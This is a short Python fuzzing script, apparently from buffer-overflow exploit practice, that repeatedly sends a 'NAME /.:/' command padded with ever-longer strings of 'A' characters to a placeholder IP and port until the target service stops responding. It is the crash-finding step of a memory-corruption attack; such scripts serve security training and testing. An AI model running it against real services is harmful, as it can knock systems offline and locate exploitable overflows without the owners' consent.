#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "NAME /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP',PORT))
        print ("[+] Transmission The Payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except:
        print ("The Fuzzing Start %s bytes" % str(len(buffer)))
        sys.exit()
